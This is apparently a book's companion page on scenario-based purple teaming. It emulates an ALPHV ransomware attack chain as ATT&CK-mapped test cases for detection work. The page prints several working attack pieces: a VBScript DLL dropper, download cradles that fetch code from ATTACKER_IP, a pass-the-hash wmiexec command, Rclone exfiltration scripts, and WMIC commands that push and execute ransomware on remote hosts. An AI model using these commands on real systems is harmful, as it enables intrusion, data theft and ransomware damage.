---
layout: default
title: The Scenario-based Methodology
tags: []
header_type       : "hero"
include_on_search : true
show_tags         : true
---


<div class="bs-component">
    <div class="progress">
        <div class="progress-bar progress-bar-striped progress-bar-animated" role="progressbar" aria-valuemin="0" aria-valuemax="100" style="width: 33.3%; background-color:#eb34e1"></div>
    </div>
</div>

## Introduction

This chapter introduces a second purple teaming methodology - scenario-based testing. 

The complete test suites produced in this chapter can be found here:

<details>
<summary><b>Initial Access and Execution Techniques</b></summary>

<table class="table">
  <thead class="thead-light">
    <tr>
      <th scope="col">#</th>
      <th scope="col">Name</th>
      <th scope="col">Technique</th>
      <th scope="col">ATT&CK ID</th>
      <th scope="col">Procedure notes</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th scope="row">1</th>
      <td>Zipped VBS Email Link</td>
      <td>Spearphishing link</td>
      <td>T1566.002</td>
      <td>Zip password: <code>W1289</code></td>
    </tr>
    <tr>
      <th scope="row">2</th>
      <td>VBScript DLL Dropper</td>
      <td>Visual Basic</td>
      <td>T1059.005</td>
      <td>Drop DLL to <code>C:\Windows\Temp\0370-1.dll</code></td>
    </tr>
    <tr>
      <th scope="row">3</th>
      <td>Regsvr32 DLL Execution</td>
      <td>Regsvr32</td>
      <td>T1218.010</td>
      <td>Fetch and drop DLL to <code>%APPDATA%\iwiqocacod.dll</code></td>
    </tr>
    <tr>
      <th scope="row">4</th>
      <td>Rundll32 DLL Execution</td>
      <td>Rundll32</td>
      <td>T1218.011</td>
      <td>Execute via <code>cmd /c</code></td>
    </tr>
  </tbody>
</table>


</details>
<details>
<summary><b>Persistence Techniques</b></summary>

<table class="table">
  <thead class="thead-light">
    <tr>
      <th scope="col">#</th>
      <th scope="col">Name</th>
      <th scope="col">Technique</th>
      <th scope="col">ATT&CK ID</th>
      <th scope="col">Procedure notes</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th scope="row">5</th>
      <td>Scheduled Task via API</td>
      <td>Scheduled task</td>
      <td>T1053.005</td>
      <td>Task repeats every hour after user logon. Executes DLL via <code>rundll32</code> with ordinal value (<code>#1</code>)</td>
    </tr>
  </tbody>
</table>

</details>

<details>
<summary><b>Discovery Techniques</b></summary>

<table class="table">
  <thead class="thead-light">
    <tr>
      <th scope="col">#</th>
      <th scope="col">Name</th>
      <th scope="col">Technique</th>
      <th scope="col">ATT&CK ID</th>
      <th scope="col">Procedure notes</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th scope="row">6</th>
      <td><code>cmd.exe /c chcp >&2</code></td>
      <td>System language discovery</td>
      <td>T1614.001</td>
      <td>Spawned from <code>rundll32</code></td>
    </tr>
    <tr>
      <th scope="row">7</th>
      <td><code>ipconfig /all</code></td>
      <td>System network configuration discovery</td>
      <td>T1016</td>
      <td>Spawned from <code>rundll32</code> and ScreenConnect</td>
    </tr>
    <tr>
      <th scope="row">8</th>
      <td><code>systeminfo</code></td>
      <td>System information discovery</td>
      <td>T1082</td>
      <td>Spawned from <code>rundll32</code> and ScreenConnect</td>
    </tr>
    <tr>
      <th scope="row">9</th>
      <td><code>net config workstation</code></td>
      <td>System owner/user discovery</td>
      <td>T1033</td>
      <td>Spawned from <code>rundll32</code></td>
    </tr>
    <tr>
      <th scope="row">10</th>
      <td><code>nltest /domain_trusts</code></td>
      <td>Domain trust discovery</td>
      <td>T1482</td>
      <td>Spawned from <code>rundll32</code></td>
    </tr>
    <tr>
      <th scope="row">11</th>
      <td><code>nltest /domain_trusts /all_trusts</code></td>
      <td>Domain trust discovery</td>
      <td>T1482</td>
      <td>Spawned from <code>rundll32</code></td>
    </tr>
    <tr>
      <th scope="row">12</th>
      <td><code>net view /all /domain</code></td>
      <td>Remote system discovery</td>
      <td>T1018</td>
      <td>Spawned from <code>rundll32</code></td>
    </tr>
    <tr>
      <th scope="row">13</th>
      <td><code>net view /all</code></td>
      <td>Remote system discovery</td>
      <td>T1018</td>
      <td>Spawned from <code>rundll32</code></td>
    </tr>
    <tr>
      <th scope="row">14</th>
      <td><code>net group "Domain Admins" /domain</code></td>
      <td>Domain groups</td>
      <td>T1069.002</td>
      <td>Spawned from <code>rundll32</code> and ScreenConnect</td>
    </tr>
    <tr>
      <th scope="row">15</th>
      <td><code>nltest  /dclist:</code></td>
      <td>Remote system discovery</td>
      <td>T1018</td>
      <td>Executed via ScreenConnect</td>
    </tr>
    <tr>
      <th scope="row">16</th>
      <td><code>net group "Domain Computers" /domain</code></td>
      <td>Remote system discovery</td>
      <td>T1018</td>
      <td>Spawned from <code>rundll32</code> and via ScreenConnect</td>
    </tr>
    <tr>
      <th scope="row">17</th>
      <td><code>net group "enterprise admin" /domain</code></td>
      <td>Domain groups</td>
      <td>T1069.002</td>
      <td>Spawned from <code>rundll32</code></td>
    </tr>
    <tr>
      <th scope="row">18</th>
      <td><code>quser</code></td>
      <td>System owner/user discovery</td>
      <td>T1033</td>
      <td>Executed via ScreenConnect</td>
    </tr>
    <tr>
      <th scope="row">19</th>
      <td><code>route print</code></td>
      <td>System network configuration discovery</td>
      <td>T1016</td>
      <td>Executed via ScreenConnect</td>
    </tr>
    <tr>
      <th scope="row">20</th>
      <td>Port scan via netscan</td>
      <td>Network service scanning</td>
      <td>T1423</td>
      <td>Binary dropped to desktop. Scan ports 135, 137, 445, 3389, 6160, 9392, 9393 and 9401</td>
    </tr>
  </tbody>
</table>

</details>

<details>
<summary><b>Command and Control Techniques</b></summary>

<table class="table">
  <thead class="thead-light">
    <tr>
      <th scope="col">#</th>
      <th scope="col">Name</th>
      <th scope="col">Technique</th>
      <th scope="col">ATT&CK ID</th>
      <th scope="col">Procedure notes</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th scope="row">21</th>
      <td>IcedID C2</td>
      <td>Web protocols</td>
      <td>T1071.001</td>
      <td>Using multiple custom domains. TLS traffic on port 443.</td>
    </tr>
    <tr>
      <th scope="row">22</th>
      <td>ScreenConnect Installation</td>
      <td>Remote access software</td>
      <td>T1219</td>
      <td>Dropped to <code>%LOCALAPPDATA%\Temp</code> via IcedID C2</td>
    </tr>
    <tr>
      <th scope="row">23</th>
      <td>ScreenConnect C2</td>
      <td>Remote access software</td>
      <td>T1219</td>
      <td>Subdomains of <code>screenconnect.com</code></td>
    </tr>
    <tr>
      <th scope="row">24</th>
      <td>BITSAdmin Beacon Download</td>
      <td>BITS jobs</td>
      <td>T1197</td>
      <td>Executed via ScreenConnect</td>
    </tr>
    <tr>
      <th scope="row">25</th>
      <td>CertUtil</td>
      <td>Ingress tool transfer</td>
      <td>T1197</td>
      <td>Executed via ScreenConnect</td>
    </tr>
    <tr>
      <th scope="row">26</th>
      <td>PowerShell Download Cradle</td>
      <td>Web service</td>
      <td>T1102</td>
      <td>Executed via ScreenConnect. Use of <code>temp.sh</code> file hosting</td>
    </tr>
    <tr>
      <th scope="row">27</th>
      <td>Cobalt Strike C2</td>
      <td>Web protocols</td>
      <td>T1071.001</td>
      <td>Raw IP address<br><code>GET /load</code><br/><code>POST /submit.php</code><br/>60 second sleep<br/> No sleep</td>
    </tr>
    <tr>
      <th scope="row">28</th>
      <td>CSharp Streamer Upload</td>
      <td>Ingress tool transfer</td>
      <td>T1105</td>
      <td>Executable uploaded and launched from Desktop via existing C2</td>
    </tr>
    <tr>
      <th scope="row">29</th>
      <td>CSharp Streamer Websocket C2</td>
      <td>Web protocols</td>
      <td>T1071.001</td>
      <td>Websocket C2 across ports 80, 135, 139, 443, 3389</td>
    </tr>
    <tr>
      <th scope="row">30</th>
      <td>Rclone Download</td>
      <td>Ingress tool transfer</td>
      <td>T1105</td>
      <td>Download via browser on file server</td>
    </tr>
  </tbody>
</table>
</details>

<details>
<summary><b>Lateral Movement Techniques</b></summary>

<table class="table">
  <thead class="thead-light">
    <tr>
      <th scope="col">#</th>
      <th scope="col">Name</th>
      <th scope="col">Technique</th>
      <th scope="col">ATT&CK ID</th>
      <th scope="col">Procedure notes</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th scope="row">31</th>
      <td>Tool transfer via SMB</td>
      <td>SMB/Windows admin shares</td>
      <td>T1021.002</td>
      <td>Uploaded to <code>C:\ProgramData\goat.exe</code> on DC and backup server<br/>Uploaded to <code>C:\ProgramData\jer.exe</code> on file server</td>
    </tr>
    <tr>
      <th scope="row">32</th>
      <td>Execution via WMIexec.py</td>
      <td>Windows remote management</td>
      <td>T1021.006</td>
      <td>Default output to <code>ADMIN$</code><br/>Proxied via CSharp Streamer<br/>Targeting DC</td>
    </tr>
    <tr>
      <th scope="row">33</th>
      <td>Tool Transfer via RDP</td>
      <td>Remote Desktop Protocol</td>
      <td>T1021.001</td>
      <td>Upload ScreenConnect to desktop as <code>db.exe</code> and launch</td>
    </tr>
    <tr>
      <th scope="row">34</th>
      <td>Lateral Movement via RDP</td>
      <td>Remote Desktop Protocol</td>
      <td>T1021.001</td>
      <td>Using native RDP client<br/>RDP to domain controller and file server</td>
    </tr>
    <tr>
      <th scope="row">35</th>
      <td>Proxied RDP</td>
      <td>Remote Desktop Protocol</td>
      <td>T1021.001</td>
      <td>SOCKS proxy RDP traffic from remote host</td>
    </tr>
  </tbody>
</table>

</details>

<details>
<summary><b>Credential Access Techniques</b></summary>

<table class="table">
  <thead class="thead-light">
    <tr>
      <th scope="col">#</th>
      <th scope="col">Name</th>
      <th scope="col">Technique</th>
      <th scope="col">ATT&CK ID</th>
      <th scope="col">Procedure notes</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th scope="row">36</th>
      <td>Dump LSASS from <code>cslite</code></td>
      <td>LSASS memory</td>
      <td>T1003.001</td>
      <td>Using Mimikatz implementation</td>
    </tr>
    <tr>
      <th scope="row">37</th>
      <td>Dump LSASS from <code>WerFault</code></td>
      <td>LSASS memory</td>
      <td>T1003.001</td>
      <td>Using Mimikatz implementation</td>
    </tr>
    <tr>
      <th scope="row">38</th>
      <td>Dump LSASS from <code>rundll32</code></td>
      <td>LSASS memory</td>
      <td>T1003.001</td>
      <td>Using Mimikatz implementation</td>
    </tr>
    <tr>
      <th scope="row">39</th>
      <td>Perform DCSync</td>
      <td>DCSync</td>
      <td>T1003.006</td>
      <td>Using Mimikatz implementation</td>
    </tr>
  </tbody>
</table>

</details>




<details>
<summary><b>Collection Techniques</b></summary>

<table class="table">
  <thead class="thead-light">
    <tr>
      <th scope="col">#</th>
      <th scope="col">Name</th>
      <th scope="col">Technique</th>
      <th scope="col">ATT&CK ID</th>
      <th scope="col">Procedure notes</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th scope="row">40</th>
      <td>Automated collection via <code>confucius_cpp</code></td>
      <td>Data from Network Shared Drive</td>
      <td>T1039</td>
      <td>Executed from file server</td>
    </tr>
  </tbody>
</table>


</details>


<details>
<summary><b>Exfiltration Techniques</b></summary>

<table class="table">
  <thead class="thead-light">
    <tr>
      <th scope="col">#</th>
      <th scope="col">Name</th>
      <th scope="col">Technique</th>
      <th scope="col">ATT&CK ID</th>
      <th scope="col">Procedure notes</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th scope="row">41</th>
      <td>Exfiltration via SFTP using Rclone</td>
      <td>Exfiltration over asymmetric encrypted non-C2 protocol</td>
      <td>T1048.002</td>
      <td>Executed from file server<br/>Raw IP on port 22<br/>VBS->BAT->Rclone</td>
    </tr>
  </tbody>
</table>
</details>


<details>
<summary><b>Impact Techniques</b></summary>

<table class="table">
  <thead class="thead-light">
    <tr>
      <th scope="col">#</th>
      <th scope="col">Name</th>
      <th scope="col">Technique</th>
      <th scope="col">ATT&CK ID</th>
      <th scope="col">Procedure notes</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th scope="row">42</th>
      <td>Use of xcopy for ScreenConnect transfer</td>
      <td>Lateral tool transfer</td>
      <td>T1570</td>
      <td>Executed from backup server<br/>Transfer to C drive</td>
    </tr>
    <tr>
      <th scope="row">43</th>
      <td>Use of xcopy for ransomware transfer</td>
      <td>Lateral tool transfer</td>
      <td>T1570</td>
      <td>Executed from backup server<br/>Transfer to <code>C:\ProgramData</code></td>
    </tr>
    <tr>
      <th scope="row">44</th>
      <td>ScreenConnect execution with WMIC</td>
      <td>Windows remote management</td>
      <td>T1021.006</td>
      <td>Executed from backup server</td>
    </tr>
    <tr>
      <th scope="row">45</th>
      <td>Ransomware execution with WMIC</td>
      <td>Windows remote management</td>
      <td>T1021.006</td>
      <td>Executed from backup server<br/>Limit to a benign executable.<br/>Save encryption testing for lab environment</td>
    </tr>
    <tr>
      <th scope="row">46</th>
      <td>Veeam backup deletion</td>
      <td>Inhibit system recovery</td>
      <td>T1490</td>
      <td>Manual deletion</td>
    </tr>
  </tbody>
</table>



</details>



<hr>

## Chapter Content

This section provides reproductions of the key figures and code snippets seen in this chapter.

#### Scoping and Sequencing

##### Planning Attack Chains

<figure>
<img src="/assets/images/4/scenarios-0.png" style="width: 75%" title="Figure 4-1"/>
<figcaption>Figure 4-1: Plotting attack chain scenarios</figcaption>
</figure>

##### Making Mid-exercise Improvements

<figure>
<img src="/assets/images/4/scenarios-1.png" style="width: 75%" title="Figure 4-2"/>
<figcaption>Figure 4-2: The cyclical process of technique execution, defensive improvement, and subsequent validation</figcaption>
</figure>


#### Generating Test Cases

##### Initial Access and Execution

The VBScript file embedded in a password-protected ZIP, delivered via a link in the body of an email.

```vb
Data="T|V|q|Q|A|A|M|A|A|A|A|E|A|A|A|A|bart/|..."
Dim T, T0, T1
T0 = Replace(Data, "|", "")
T1 = Replace(T0, "bart", "")
T2 = Replace(T1, "biboran", "")
T = T2

Dim D,E,B,S
Set D=CreateObject("Microsoft.XMLDOM")
Set E=D.createElement("E")
E.DataType="bin.base64"
E.Text=T
B=E.NodeTypedValue

Set objShell = CreateObject( "WScript.Shell" )

quick_launch_location = "C://windows/Temp/0370-1.dll"

Set S=CreateObject("ADODB.Stream")
S.Open
S.Type=1
S.Write B
S.SaveToFile quick_launch_location,2
S.Close

objShell.Run "C://windows/system32/regsvr32.exe " & quick_launch_location
```

##### Discovery

The list of commands executed as part of the discovery phase of the scenario.

```sh
cmd.exe /c chcp >&2
ipconfig /all
systeminfo
net config workstation
nltest /domain_trusts
nltest /domain_trusts /all_trusts
net view /all /domain
net view /all
net group "Domain Admins" /domain
nltest /dclist:
net group "Domain Computers" /domain
net group "enterprise admins" /domain
quser
route print
```

##### Command and Control

The list of commands used to download tools onto compromised endpoints.

```sh
bitsadmin /transfer mydownloadjob /download /priority normal http://ATTACKER_IP/download/test1.exe C:\programdata\s1.exe (failed)

certutil -urlcache -split -f http://ATTACKER_IP/download/test1.exe C:\programdata\cscs.exe 

powershell.exe -nop -w hidden -c “IEX ((new-object net.webclient).downloadstring('http://ATTACKER_IP/ksajSk'))”

powershell.exe Invoke-WebRequest http://temp.sh/ATTACKER_URL/http64.exe -OutFile C:\programdata\rr.exe   # Failed
```

##### Lateral Movement

The Impacket <i>WMIexec.py</i> command used to execute a binary on a remote system.

```sh
python wmiexec.py -hashes :NThash DOMAIN/DomainAdmin@DC_IP C:\ProgramData\goat.exe
```


##### Exfiltration

The command used to configure RClone.

```sh
Rclone.exe config
```

A VBScript used to execute a BAT file that subsequently executes RClone to copy content to a remote server.

```vb
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "c:\programdata\rcl.bat" & Chr(34), 0
Set WshShell = Nothing
```

An example of what the BAT file could contain.

```sh
@echo off
Rclone.exe copy SRC_PATH DEST_HOST:DEST_PATH
```

##### Impact

Commands used to push the ScreenConnect installer and the encrypter malware to remote hosts and execute them with the `wmic` command.

```sh
# ScreenConnect installer
xcopy /F /Y "C:\programdata\setup.exe" "\\TARGET_HOST_IP\C$"  
cmd /c wmic /node:TARGET_HOST_IP process call create "C:\setup.exe"  

# File encrypter malware execution
xcopy /F /Y "C:\programdata\BNUfUOmFT2.exe" "\\TARGET_HOST_IP\C$\programdata"
cmd /c wmic /node:TARGET_HOST_IP process call create "C:\programdata\BNUfUOmFT2.exe p7BQXbycbpiH -QnA -4Nc -gd -A -4heGxsuj -yreVf -91nHs -9eGxd -etRzp6kw -gzfW3"
```

#### The Test Suite

<figure>
<img src="/assets/images/4/summary-0.png" style="width: 75%" title="Figure 4-3"/>
<figcaption>Figure 4-3: The techniques to be executed in a purple team scenario, from the initial access phase through credential access</figcaption>
</figure>

<figure>
<img src="/assets/images/4/summary-1.png" style="width: 75%" title="Figure 4-4"/>
<figcaption>Figure 4-4: The techniques to be executed at the conclusion of the purple team exercise, from credential access to ransomware deployment in the impact phase.</figcaption>
</figure>


#### Data to Capture

##### Detection Aggregation and User Analytics

<figure>
<img src="/assets/images/4/results-0.png" style="width: 75%" title="Figure 4-5"/>
<figcaption>Figure 4-5: The risk level increases as low-severity alerts are triggered.</figcaption>
</figure>


#### Plotting Results

##### Detection and Containment Time

<figure>
<img src="/assets/images/4/ttc-0.png" style="width: 75%" title="Figure 4-6"/>
<figcaption>Figure 4-6: A plot of time taken to detect and contain an attack, including the portion of the attack chain prevented</figcaption>
</figure>

<figure>
<img src="/assets/images/4/ttc-1.png" style="width: 75%" title="Figure 4-7"/>
<figcaption>Figure 4-7: An example plot with data points for detection and prevention across an exercise</figcaption>
</figure>

##### Exercise Comparisons

<figure>
<img src="/assets/images/4/ttc-2.png" style="width: 75%" title="Figure 4-8"/>
<figcaption>Figure 4-8: Two exercise outcomes plotted together to articulate a change in defensive performance</figcaption>
</figure>



<hr>

## Resources

The following resources expand on topics covered in this chapter.
<br/>
<br/>

#### Generating Test Cases

<div class="row row-cols-1 row-cols-md-1">
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>A writeup from the DFIR Report of an ALPHV ransomware attack</h6>
                <p><i>"IcedID Brings ScreenConnect and CSharp Streamer to ALPHV Ransomware Deployment" Accessed June 10, 2024</i></p>
                <a target="_blank" href="https://thedfirreport.com/2024/06/10/icedid-brings-screenconnect-and-csharp-streamer-to-alphv-ransomware-deployment/" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>

</div>
#### Initial Access and Execution

<div class="row row-cols-1 row-cols-md-1">
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>A sandbox execution of the original VBS script used as part of the initial access phase of the ALPHV ransomware attack</h6>
                <p><i>"Analysis Document [2023.10.11_08-07]_5.vbs" Accessed August 24, 2024</i></p>
                <a target="_blank" href="https://app.any.run/tasks/cb8ef3f3-5d25-46cf-a6da-26712b04bb0c/" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>

</div>
#### Discovery

<div class="row row-cols-1 row-cols-md-1">
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>Details of the ports used by the Veeam software, targeted for port scanning as part of the emulated discovery activities</h6>
                <p><i>"Ports: Veeam Agent Management Guide" Accessed August 24, 2024</i></p>
                <a target="_blank" href="https://helpcenter.veeam.com/docs/backup/agents/used_ports.html" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>

</div>
#### Command and Control

<div class="row row-cols-1 row-cols-md-1">
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>Details of the features of Cobalt Strike's malleable profile and how it can be customized</h6>
                <p><i>Chris Navarrete, Durgesh Sangvikar, Andrew Guan, Yu Fu, Yanhui Jia, Siddhart Shibiraj, "Cobalt Strike Analysis and Tutorial: How Malleable C2 Profiles Make Cobalt Strike Difficult to Detect" March 16, 2022</i></p>
                <a target="_blank" href="https://unit42.paloaltonetworks.com/cobalt-strike-malleable-c2-profile/" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>

</div>
#### Lateral Movement

<div class="row row-cols-1 row-cols-md-1">
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>An analysis of Impacket scripts and the indicators that can be used for effective detection</h6>
                <p><i>Riccardo Ancarani, "Hunting for Impacket," 10 May, 2020</i></p>
                <a target="_blank" href="https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>

</div>
#### Credential Access

<div class="row row-cols-1 row-cols-md-1">
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>Operational security consideration for using Cobalt Strike's beacon commands</h6>
                <p><i>"Beacon Command Behavior and OPSEC Considerations," Forta, Accessed August 24, 2024</i></p>
                <a target="_blank" href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/appendix-a_beacon-opsec-considerations.htm" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>

</div>
#### Collection

<div class="row row-cols-1 row-cols-md-1">
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>Snaffler, a popular post-exploitation tool for identifying and gathering sensitive information, such as credential material, from network shares</h6>
                <p><i>"Snaffler," Accessed September 15, 2024</i></p>
                <a target="_blank" href="https://github.com/SnaffCon/Snaffler" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>

</div>

#### Impact

<div class="row row-cols-1 row-cols-md-1">
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>Different methods of encryptions used in ransomware execution</h6>
                <p><i>Yimi Hu, "A brief summary of encryption method used in widespread ransomware," Infosec Institute, January 13, 2017</i></p>
                <a target="_blank" href="https://www.infosecinstitute.com/resources/cryptography/a-brief-summary-of-encryption-method-used-in-widespread-ransomware" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>

</div>

#### Creating Custom Tooling

<div class="row row-cols-1 row-cols-md-1">
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>An overview of CSharp Streamer and its capabilities</h6>
                <p><i>Hendrik Eckardt, "The csharp-streamer RAT," cyber.wtf, December 6, 2023</i></p>
                <a target="_blank" href="https://cyber.wtf/2023/12/06/the-csharp-streamer-rat/" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>

</div>

<div class="container">
  <div class="row">
    <div class="col" style="text-align: left">
      <a href="/part-I/the-atomic-methodology/" class="btn btn-primary"><< Chapter 3</a>
    </div>
    <div class="col" style="text-align: right">
      <a href="/part-II/environment-setup/" class="btn btn-primary">Chapter 5 >></a>
    </div>
  </div>
</div>